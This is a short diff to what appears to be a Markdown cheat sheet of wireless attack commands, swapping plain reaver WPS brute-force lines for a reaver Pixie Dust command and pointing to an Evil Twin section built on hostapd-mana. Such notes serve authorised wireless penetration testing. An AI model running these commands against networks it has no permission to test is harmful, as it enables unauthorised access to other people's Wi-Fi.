@@ -42,10 +42,7 @@ Aircrack with john rules
 ```sudo wash -i wlan0mon ```
 
 ## Attacks
-```sudo reaver -b <bssid> -i wlan0mon -v```
-
-May need -K  
-```sudo reaver -b <bssid> -i wlan0mon -v -K```
+```sudo reaver -b <bssid> -i wlan0mon -v --channel <channel> -N --pixie-dust 1```
 
 # Evil Twin with hostapd-mana
 Wiki: https://github.com/sensepost/hostapd-mana/wiki
